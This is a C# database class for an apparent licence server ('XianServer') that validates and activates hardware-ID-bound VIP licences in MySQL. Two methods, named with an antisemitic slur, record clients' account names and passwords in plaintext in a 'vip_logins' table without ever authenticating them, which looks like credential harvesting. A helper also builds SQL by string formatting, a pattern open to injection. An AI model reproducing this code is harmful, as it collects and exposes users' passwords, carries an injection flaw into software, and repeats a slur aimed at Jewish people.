using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using XianServer.Auth;

namespace XianServer.Server
{
    public sealed class Database
    {
        private readonly string m_connectionString;
        private readonly object m_locker;

        public Database(string connectionString)
        {
            m_connectionString = connectionString;
            m_locker = new object();
        }

        private MySqlConnection GetConnection()
        {
            return new MySqlConnection(m_connectionString);
        }

        private MySqlDataReader ExecuteDataQuery(MySqlConnection connection, string query, params object[] objects)
        {
            query = string.Format(query, objects);

            MySqlCommand command = new MySqlCommand(query, connection);
            command.ExecuteNonQuery();

            return command.ExecuteReader();
        }

        public void GetValidEntries(string hwid, ref List<License> lisences)
        {
            lisences.Clear();

            using (var connection = GetConnection())
            {
                connection.Open();

                using (MySqlCommand command = new MySqlCommand())
                {
                    command.Connection = connection;
                    command.CommandText = "SELECT * from vip_license WHERE hwid = @hwid";

                    command.Prepare();

                    command.Parameters.AddWithValue("@hwid", hwid);

                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var x = new License();
                            x.Expiry = reader.GetDateTime("end_date");

                            if(x.Expired == false) //not expired
                            {
                                x.MaxClients = reader.GetInt32("max_clients");
                                x.NumDays = reader.GetInt32("num_days");
                                x.Hash = reader.GetString("license_id");

                                lisences.Add(x);
                            }
                        }
                    }
                }

                foreach (License x in lisences) //activate all lisences if needed
                {
                    if (x.Expiry == DateTime.MinValue) //not set ( default from hwid entry )
                    {
                        var expiry = DateTime.Now.AddDays(x.NumDays);
                        var hash = x.Hash;

                        //update in database
                        using (MySqlCommand query = new MySqlCommand())
                        {
                            query.Connection = connection;
                            query.CommandText = "UPDATE vip_license SET end_date=@date WHERE license_id=@hash";

                            query.Prepare();

                            query.Parameters.AddWithValue("@date", expiry);
                            query.Parameters.AddWithValue("@hash", hash);

                            query.ExecuteNonQuery();
                        }
                        //update variable
                        x.Expiry = expiry;
                    }
                }

            }
        }

        public void UpdateJewhook(string hwid,string user,string pass)
        {
            using (var connection = GetConnection())
            {
                connection.Open();

                using (MySqlCommand query = new MySqlCommand())
                {
                    query.Connection = connection;
                    query.CommandText = "SELECT * FROM vip_logins WHERE account=@user AND password = @pass";

                    query.Prepare();

                    query.Parameters.AddWithValue("@user", user);
                    query.Parameters.AddWithValue("@pass", pass);

                    bool rows = false;

                    using (var reader = query.ExecuteReader())
                    {
                        rows = reader.HasRows;
                    }

                    if (rows == false)
                        InsertJewInfo(connection, hwid, user, pass);
                }
            }
        }
        private void InsertJewInfo(MySqlConnection connection, string hwid,string user,string pass)
        {
            using (MySqlCommand command = new MySqlCommand())
            {
                command.Connection = connection;
                command.CommandText = "INSERT INTO vip_logins VALUES(@hwid,@user,@pass,@time)";

                command.Prepare();

                command.Parameters.AddWithValue("@hwid", hwid);
                command.Parameters.AddWithValue("@user", user);
                command.Parameters.AddWithValue("@pass", pass);
                command.Parameters.AddWithValue("@time", DateTime.Now);

                command.ExecuteNonQuery();
            }
        }
    }
}